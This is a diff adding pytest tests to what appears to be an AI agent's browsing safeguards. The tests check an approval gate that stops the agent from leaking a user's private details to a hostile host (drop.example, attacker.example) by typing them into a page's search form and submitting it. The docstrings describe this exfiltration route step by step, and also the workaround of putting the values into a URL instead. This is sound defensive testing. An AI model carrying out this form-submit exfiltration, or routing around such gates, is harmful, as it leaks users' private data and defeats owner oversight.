@@ -18,11 +18,11 @@ import pytest
 
 from aish import agent as agent_module
 from aish import backends as backends_module
+from aish import browse, tool_plugins
 from aish import rules as rules_module
 from aish import secrets as secrets_module
 from aish import session as session_module
 from aish import skills as skills_module
-from aish import tool_plugins
 from aish import tools as tools_module
 from aish.agent import AISH_NOTE, DENIED_RESULT, Agent
 from aish.approval import Approved, Blocked, Denied
@@ -12701,3 +12701,206 @@ class TestALinkThatArrivedByMail:
         agent._mail_links = {"https://x.test/a": provenance.SIGN_IN}
         assert agent._mail_link_gate("browse", {"url": "https://x.test/a"}) is not None
         assert agent._mail_link_gate("read_pdf", {"source": "https://x.test/a"}) is not None
+
+
+class TestTheDrivenTwinOfTheComposedAddress:
+    """#295 M3, part 1. A later slice re-anchors the site grant so inert
+    presses stop asking, and that opens a path only the site card blocks today:
+    open an attacker's page (a plain URL — free), type prose into its search box
+    (typing is free), press its GET submit (inert — free). The page builds
+    `https://attacker.example/?q=<the owner's mail in plain words>` out of its
+    own form, and no value check catches prose.
+
+    So a form submit carrying values aish itself typed this task, at a host with
+    NO vouch, is the same egress as a composed query URL: same question, same
+    card, same vouch. At a vouched host it is free, which is everywhere he
+    actually drives."""
+
+    HOSTILE = "https://drop.example/search"
+    SECRET = "his hospital appointment is on the 4th at 9am with dr Nowak"
+
+    def _form(self, method="get"):
+        return browse.controls_from([
+            {"n": 1, "kind": "field", "name": "Search", "form": "f1"},
+            {"n": 2, "kind": "button", "name": "Go", "submits": True,
+             "method": method, "form": "f1"},
+        ])
+
+    def _agent(self, origin="user", vouched=(), granted=("drop.example",),
+               approve_tool="yes", method="get"):
+        asked: list = []
+        logged: list = []
+        if approve_tool == "yes":
+            def approve_tool(name, args, preview=None):  # noqa: F811
+                asked.append(preview)
+                return True
+        agent, _ = make_agent(
+            [], approve_tool=approve_tool, state_log=logged.append, origin=origin
+        )
+        agent._tainted = True  # the page was opened, which is what taints a turn
+        agent._browse_view.remember(browse.Snapshot(
+            url=self.HOSTILE, title="", text="t", controls=self._form(method)
+        ))
+        agent._approved_hosts.update(vouched)
+        agent._approved_sites.update(granted)
+        return agent, asked, logged
+
+    #: Type the stolen paragraph into the box, then press the GET submit.
+    STEPS = (
+        {"target": "Search", "value": SECRET},
+        {"target": "Go", "do": "click"},
+    )
+
+    def test_a_fill_then_submit_at_an_unvouched_host_asks(self):
+        """The attack, in one call, at a site aish was already allowed to press
+        things on. Nothing else in the codebase stops this."""
+        agent, asked, _ = self._agent()
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert len(asked) == 1
+        assert "send data to drop.example" in asked[0]
+        assert "1 value(s) aish typed into the page" in asked[0]
+        assert "you have never agreed to send anything there" in asked[0]
+
+    def test_the_identical_batch_at_a_vouched_host_is_free(self):
+        """The control arm, and the reason ordinary form-filling never sees
+        this: the same call, one host in `_approved_hosts`, no card at all."""
+        agent, asked, _ = self._agent(vouched=["drop.example"])
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert asked == []
+
+    def test_unattended_it_is_refused(self):
+        """A triggered session keeps the strict rule reads already keep: it
+        cannot answer a card, so it does not get one."""
+        agent, _, _ = self._agent(origin="schedule", approve_tool=None)
+        out = agent._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+        assert out is not None
+        assert "NOT EXECUTED" in out
+
+    def test_unattended_a_vouch_does_not_free_it(self):
+        """Strict means strict: unattended, a payload at a host the owner DID
+        vouch for still gates, exactly as `_egress_novel_hosts` gates a payload
+        at a host he merely named."""
+        agent, _, _ = self._agent(
+            origin="schedule", vouched=["drop.example"], approve_tool=None
+        )
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is not None
+
+    def test_unattended_the_card_never_says_he_agreed_to_anything(self):
+        """The finding states what a line checked. Unattended the vouch was not
+        consulted, so the clause about it must not be on the card."""
+        agent, asked, _ = self._agent(origin="schedule", vouched=["drop.example"])
+        agent._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+        assert len(asked) == 1
+        assert "never agreed" not in asked[0]
+        assert "1 value(s) aish typed into the page" in asked[0]
+
+    def test_the_two_call_shape_gets_the_same_answer(self):
+        """Fill in one call, submit in another — the shape the model reaches for
+        when a page answers between the two. The record is per TASK, so the
+        submit still knows what was typed."""
+        agent, asked, _ = self._agent()
+        fill = {"steps": [dict(self.STEPS[0])]}
+        assert agent._browse_gate("browse_fill", fill) is None
+        assert asked == []  # typing alone commits nothing and sends nothing
+        agent._note_typed_values("browse_fill", fill)
+        assert agent._browse_gate("browse_act", {"target": "Go"}) is None
+        assert len(asked) == 1
+        assert "send data to drop.example" in asked[0]
+
+    def test_pressing_enter_in_the_field_is_a_submit_too(self):
+        """`browse_act(action="type", submit=True)` sends the form without
+        pressing its button. A check that read only `Control.submits` would be
+        walked past by the one argument that exists to send without a press."""
+        agent, asked, _ = self._agent()
+        args = {"target": "Search", "action": "type", "text": self.SECRET,
+                "submit": True}
+        assert agent._browse_gate("browse_act", args) is None
+        assert len(asked) == 1
+        assert "send data to drop.example" in asked[0]
+
+    def test_typing_without_sending_is_still_free(self):
+        """Typing has never been mutating and nothing is committed until
+        something is pressed. This slice does not change that."""
+        agent, asked, _ = self._agent()
+        assert agent._browse_gate(
+            "browse_act",
+            {"target": "Search", "action": "type", "text": self.SECRET},
+        ) is None
+        assert asked == []
+
+    def test_a_submit_carrying_nothing_aish_typed_is_free(self):
+        """The rule is about VALUES aish composed, not about submitting. A
+        press on a form aish never typed into carries nothing of the task's."""
+        agent, asked, _ = self._agent()
+        assert agent._browse_gate("browse_act", {"target": "Go"}) is None
+        assert asked == []
+
+    def test_an_empty_value_is_not_a_payload(self):
+        """Clearing a field sends nothing, so it must not raise the fence — a
+        gate that fires on nothing is a safety cost, not an inconvenience."""
+        agent, asked, _ = self._agent()
+        assert agent._browse_gate("browse_fill", {"steps": [
+            {"target": "Search", "value": ""}, {"target": "Go", "do": "click"},
+        ]}) is None
+        assert asked == []
+
+    def test_a_yes_vouches_the_host_and_records_it(self):
+        """The same vouch a composed address collects, written the same way —
+        so the next address to this host, by either channel, is free."""
+        agent, _, logged = self._agent()
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert "drop.example" in agent._approved_hosts
+        assert {"kind": "egress_vouch", "host": "drop.example"} in logged
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://drop.example/?q=anything"}
+        ) is None
+
+    def test_a_no_says_the_form_was_not_sent(self):
+        """And tells the model the obvious way round is closed too, or an eager
+        one puts the same values into an address instead."""
+        agent, _, logged = self._agent(approve_tool=lambda n, a, p=None: False)
+        out = agent._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+        assert out is not None
+        assert "was NOT submitted" in out
+        assert "into an address instead" in out
+        assert agent._approved_hosts == set()
+        assert logged == []
+
+    def test_it_is_one_card_and_not_two(self):
+        """M1's law survives this: a press that would ask about the site AND
+        about what it sends asks once, in two clauses, and records both."""
+        agent, asked, logged = self._agent(granted=())
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert len(asked) == 1
+        assert "signed in as you" in asked[0]
+        assert "send data to drop.example" in asked[0]
+        assert {"kind": "site_grant", "host": "drop.example"} in logged
+        assert {"kind": "egress_vouch", "host": "drop.example"} in logged
+
+    def test_the_card_shows_the_values_themselves(self):
+        """A count is the finding; the values are what make it checkable at a
+        glance, which is the only condition P2 lets a card exist under."""
+        agent, asked, _ = self._agent()
+        agent._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+        assert "aish would send what it typed:" in asked[0]
+        assert "Search: " in asked[0]
+
+    def test_a_post_submit_is_covered_too(self):
+        """`Control.submits` does not distinguish GET from POST and this does
+        not teach it to: a non-GET submit is already mutating and already
+        carded, so covering it costs a clause on a card being drawn anyway."""
+        agent, asked, _ = self._agent(method="")
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert len(asked) == 1
+        assert "send data to drop.example" in asked[0]
+
+    def test_the_values_belong_to_the_task_that_typed_them(self):
+        """Taint, offered links and typed values are all per task, for the same
+        reason: a value sent while answering one question is not a licence to
+        send the next task's values to the same host."""
+        agent, asked, _ = self._agent()
+        agent._note_typed_values("browse_fill", {"steps": [dict(self.STEPS[0])]})
+        agent._reset_task_state()
+        agent._tainted = True
+        assert agent._browse_gate("browse_act", {"target": "Go"}) is None
+        assert asked == []
